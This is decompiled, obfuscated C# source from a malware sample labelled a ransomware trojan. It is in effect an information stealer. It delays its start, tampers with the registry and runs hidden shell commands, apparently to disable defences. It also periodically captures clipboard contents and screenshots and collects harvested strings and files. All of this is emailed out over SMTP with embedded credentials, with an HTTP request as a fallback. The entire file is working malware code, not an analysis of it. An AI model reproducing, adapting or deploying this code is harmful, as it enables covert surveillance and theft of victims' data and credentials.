// Decompiled with JetBrains decompiler
// Type: .
// Assembly: coproccessor, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 489BB54C-AC64-4776-B7C7-9CD76A5742AF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-c8a5aa891fc37cf6a3724b7ba25ce00e61d4f00bdc5d5c35ff70f3359185f7f5.exe

using \u0006;
using \u000E;
using \u000E\u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0004\u001E
  {
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static string \u0007;
    public static string \u0008;
    public static string \u000E;
    public static string \u000F;
    public static string \u0010;
    public static string \u0011;
    public static string \u0012 = \u0008.\u0007(177);
    public static string \u0013 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(178), \u0008.\u0007(227));
    public static string \u0014 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(236), \u0008.\u0007(227));
    public static string \u0015 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(253), \u0008.\u0007(227));
    public static int \u0016 = 587;
    public static string \u0017 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(282), \u0008.\u0007(227));
    public static string \u0018 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(295), \u0008.\u0007(227));
    public static string \u0019 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(308), \u0008.\u0007(227));
    public static string \u001A = \u0007\u001E.\u0005\u001E(\u0008.\u0007(321), \u0008.\u0007(227));
    public static string \u001B = \u0007\u001E.\u0005\u001E(\u0008.\u0007(334), \u0008.\u0007(227));
    public static string \u001C = \u0007\u001E.\u0005\u001E(\u0008.\u0007(351), \u0008.\u0007(227));
    public static string \u001D = \u0007\u001E.\u0005\u001E(\u0008.\u0007(368), \u0008.\u0007(227));
    public static string \u001E = \u0007\u001E.\u0005\u001E(\u0008.\u0007(385), \u0008.\u0007(227));
    public static string \u001F = \u0007\u001E.\u0005\u001E(\u0008.\u0007(398), \u0008.\u0007(227));
    public static string \u007F = \u0007\u001E.\u0005\u001E(\u0008.\u0007(411), \u0008.\u0007(227));
    public static string \u0080 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(424), \u0008.\u0007(227));
    public static string \u0081 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(437), \u0008.\u0007(227));
    public static string \u0082 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(450), \u0008.\u0007(227));
    public static string \u0083 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(471), \u0008.\u0007(227));
    public static int \u0084 = 1800000;
    public static string \u0086 = \u0008.\u0007(177);
    public static string \u0087 = \u0008.\u0007(177);
    public static int \u0088 = 0;
    public static \u000F\u001E \u0089;
    public static Thread \u008A = new Thread(new ThreadStart(\u0004\u001E.\u0002\u001E));
    public static Thread \u008B = new Thread(new ThreadStart(\u0004\u001E.\u0003\u001E));
    public static Thread \u008C = new Thread(new ThreadStart(\u008D\u001A.\u000E\u0005.\u0004\u0005));

    [STAThread]
    public static void \u0002()
    {
      int num1;
      try
      {
        Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread.Sleep(60000);
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(484), \u0008.\u0007(227))))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(484), \u0008.\u0007(227)));
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(525), \u0008.\u0007(227))))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(525), \u0008.\u0007(227)));
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in \u0016\u0002.\u0013\u0002().FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(525), \u0008.\u0007(227)), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, \u0008.\u0007(570)))
            System.IO.File.Delete(file);
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
        try
        {
          foreach (string file in \u0016\u0002.\u0013\u0002().FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(579), \u0008.\u0007(227))))
            System.IO.File.Delete(file);
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0004\u001E.\u008C.IsBackground = true;
        \u0004\u001E.\u008C.Start();
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      int num2 = 0;
      int num3;
      while (true)
      {
        num3 = 1;
        try
        {
          if (num2 == 3)
            Application.Restart();
          \u0004\u001E.\u0089 = new \u000F\u001E(\u0004\u001E.\u0087);
          \u000F\u001E.\u000E\u001E();
          break;
        }
        catch (Exception ex)
        {
          int lErl = num3;
          ProjectData.SetProjectError(ex, lErl);
          checked { ++num2; }
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        \u0004\u001E.\u008A.IsBackground = true;
        \u0004\u001E.\u008A.Start();
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u008A\u001A.\u000E\u0004.\u0008\u0004();
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.CompareString(\u0004\u001E.\u0017, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          \u0016\u0002.\u0013\u0002().Registry.SetValue(\u0007\u001E.\u0005\u001E(\u0008.\u0007(633), \u0008.\u0007(227)), \u0007\u001E.\u0005\u001E(\u0008.\u0007(775), \u0008.\u0007(227)), (object) \u0007\u001E.\u0005\u001E(\u0008.\u0007(804), \u0008.\u0007(227)), RegistryValueKind.DWord);
        if (Operators.CompareString(\u0004\u001E.\u0018, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          \u0016\u0002.\u0013\u0002().Registry.SetValue(\u0007\u001E.\u0005\u001E(\u0008.\u0007(813), \u0008.\u0007(227)), \u0007\u001E.\u0005\u001E(\u0008.\u0007(926), \u0008.\u0007(227)), (object) \u0007\u001E.\u0005\u001E(\u0008.\u0007(804), \u0008.\u0007(227)), RegistryValueKind.DWord);
        if (Operators.CompareString(\u0004\u001E.\u0019, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          \u0016\u0002.\u0013\u0002().Registry.SetValue(\u0007\u001E.\u0005\u001E(\u0008.\u0007(951), \u0008.\u0007(227)), \u0007\u001E.\u0005\u001E(\u0008.\u0007(1093), \u0008.\u0007(227)), (object) \u0007\u001E.\u0005\u001E(\u0008.\u0007(804), \u0008.\u0007(227)), RegistryValueKind.DWord);
        if (Operators.CompareString(\u0004\u001E.\u001A, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          Interaction.Shell(\u0007\u001E.\u0005\u001E(\u0008.\u0007(1134), \u0008.\u0007(227)), AppWinStyle.Hide);
        if (Operators.CompareString(\u0004\u001E.\u001B, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          Interaction.Shell(\u0007\u001E.\u0005\u001E(\u0008.\u0007(1420), \u0008.\u0007(227)));
        if (Operators.CompareString(\u0004\u001E.\u001C, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          Interaction.Shell(\u0007\u001E.\u0005\u001E(\u0008.\u0007(1626), \u0008.\u0007(227)), AppWinStyle.Hide);
        if (Operators.CompareString(\u0004\u001E.\u001D, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          \u0016\u0002.\u0013\u0002().Registry.SetValue(\u0007\u001E.\u0005\u001E(\u0008.\u0007(1832), \u0008.\u0007(227)), \u0007\u001E.\u0005\u001E(\u0008.\u0007(1974), \u0008.\u0007(227)), (object) \u0007\u001E.\u0005\u001E(\u0008.\u0007(804), \u0008.\u0007(227)), RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0004\u001E.\u008B.IsBackground = true;
        \u0004\u001E.\u008B.Start();
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().WaitForExit();
    }

    public static void \u0001\u001E([In] ref double obj0)
    {
      try
      {
        DateTime t2 = DateAndTime.Now.AddSeconds(obj0);
        while (DateTime.Compare(DateAndTime.Now, t2) < 0)
          Application.DoEvents();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0002\u001E()
    {
      \u0008.\u0007(177);
      while (true)
      {
        Thread.Sleep(\u0004\u001E.\u0084);
        string str1 = \u0008.\u0007(177);
        \u0008.\u0007(177);
        try
        {
          str1 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(1999), \u0008.\u0007(227)) + Environment.NewLine + Environment.NewLine + \u0016\u0002.\u0013\u0002().Clipboard.GetText() + Environment.NewLine + Environment.NewLine + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2120), \u0008.\u0007(227));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        double num1 = 0.2;
        \u0004\u001E.\u0001\u001E(ref num1);
        string str2;
        try
        {
          WebClient webClient = new WebClient();
          str2 = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2120), \u0008.\u0007(227)) + Environment.NewLine + Environment.NewLine + webClient.DownloadString(\u0007\u001E.\u0005\u001E(\u0008.\u0007(2241), \u0008.\u0007(227))) + Environment.NewLine + Environment.NewLine + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2330), \u0008.\u0007(227));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          str2 = \u0008.\u0007(177);
          ProjectData.ClearProjectError();
        }
        double num2 = 1.0;
        \u0004\u001E.\u0001\u001E(ref num2);
        try
        {
          if (Operators.CompareString(\u0004\u001E.\u0082, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
          {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2451), \u0008.\u0007(227)) + \u0004\u001E.\u0088.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2508), \u0008.\u0007(227)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        double num3 = 0.3;
        \u0004\u001E.\u0001\u001E(ref num3);
        try
        {
          if (Operators.CompareString(\u0004\u001E.\u0087, \u0008.\u0007(177), false) != 0)
          {
            \u0004\u001E.\u0086 = \u0004\u001E.\u0087 + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
            try
            {
              MailMessage message = new MailMessage();
              MailMessage mailMessage = message;
              mailMessage.From = new MailAddress(\u0004\u001E.\u0013);
              mailMessage.To.Add(\u0004\u001E.\u0013);
              mailMessage.Subject = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2521), \u0008.\u0007(227)) + Environment.UserName.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2562), \u0008.\u0007(227)) + Environment.MachineName.ToString();
              mailMessage.Body = \u0004\u001E.\u0086;
              try
              {
                if (Operators.CompareString(\u0004\u001E.\u0082, \u0007\u001E.\u0005\u001E(\u0008.\u0007(620), \u0008.\u0007(227)), false) == 0)
                {
                  Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2451), \u0008.\u0007(227)) + \u0004\u001E.\u0088.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2508), \u0008.\u0007(227)));
                  mailMessage.Attachments.Add(attachment);
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              new SmtpClient(\u0004\u001E.\u0015)
              {
                Port = \u0004\u001E.\u0016,
                EnableSsl = true,
                Credentials = ((ICredentialsByHost) new NetworkCredential(\u0004\u001E.\u0013, \u0004\u001E.\u0014))
              }.Send(message);
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              try
              {
                HttpWebResponse response = (HttpWebResponse) WebRequest.Create(\u0008.\u0007(2571) + \u0008.\u0007(2612) + \u0004\u001E.\u0013 + \u0008.\u0007(2621) + Strings.Replace(\u0007\u001E.\u0005\u001E(\u0008.\u0007(2521), \u0008.\u0007(227)) + Environment.UserName.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2562), \u0008.\u0007(227)) + Environment.MachineName.ToString(), \u0008.\u0007(2634), \u0008.\u0007(2639)) + \u0008.\u0007(2644) + Strings.Replace(\u0004\u001E.\u0086, \u0008.\u0007(2634), \u0008.\u0007(2639)) + \u0008.\u0007(2657) + \u0004\u001E.\u0013).GetResponse();
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0004\u001E.\u0086 = \u0008.\u0007(177);
        \u0004\u001E.\u0087 = \u0008.\u0007(177);
        \u0004\u001E.\u0012 = \u0008.\u0007(177);
        checked { ++\u0004\u001E.\u0088; }
      }
    }

    public static void \u0003\u001E()
    {
      int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(484), \u0007\u001E.\u0005\u001E(\u0008.\u0007(2666), \u0008.\u0007(227)))).Length;
      FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(484), \u0007\u001E.\u0005\u001E(\u0008.\u0007(2666), \u0008.\u0007(227)))).GetFiles();
      try
      {
        double num = 25.0;
        \u0004\u001E.\u0001\u001E(ref num);
        string str = \u0004\u001E.\u0001.ToString() + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0002 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0003 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0004 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0005 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0006 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0007 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0008 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u000E + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u000F + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0010 + Environment.NewLine + Environment.NewLine + \u0004\u001E.\u0011;
        if (!(Operators.CompareString(str, \u0008.\u0007(177), false) != 0 | Operators.CompareString(str, (string) null, false) != 0))
          return;
        try
        {
          MailMessage message = new MailMessage();
          MailMessage mailMessage = message;
          mailMessage.From = new MailAddress(\u0004\u001E.\u0013);
          mailMessage.To.Add(\u0004\u001E.\u0013);
          mailMessage.Subject = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2679), \u0008.\u0007(227)) + Environment.UserName.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2562), \u0007\u001E.\u0005\u001E(\u0008.\u0007(2666), \u0008.\u0007(227))) + Environment.MachineName.ToString();
          mailMessage.Body = str;
          try
          {
            FileInfo[] fileInfoArray = files;
            int index = 0;
            while (index < fileInfoArray.Length)
            {
              Attachment attachment = new Attachment(fileInfoArray[index].FullName);
              mailMessage.Attachments.Add(attachment);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          new SmtpClient(\u0004\u001E.\u0015)
          {
            Port = \u0004\u001E.\u0016,
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(\u0004\u001E.\u0013, \u0004\u001E.\u0014))
          }.Send(message);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          try
          {
            HttpWebResponse response = (HttpWebResponse) WebRequest.Create(\u0008.\u0007(2571) + \u0008.\u0007(2612) + \u0004\u001E.\u0013 + \u0008.\u0007(2621) + Strings.Replace(\u0007\u001E.\u0005\u001E(\u0008.\u0007(2679), \u0008.\u0007(227)) + Environment.UserName.ToString() + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2562), \u0007\u001E.\u0005\u001E(\u0008.\u0007(2666), \u0008.\u0007(227))) + Environment.MachineName.ToString(), \u0008.\u0007(2634), \u0008.\u0007(2639)) + \u0008.\u0007(2644) + Strings.Replace(str, \u0008.\u0007(2634), \u0008.\u0007(2639)) + \u0008.\u0007(2657) + \u0004\u001E.\u0013).GetResponse();
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
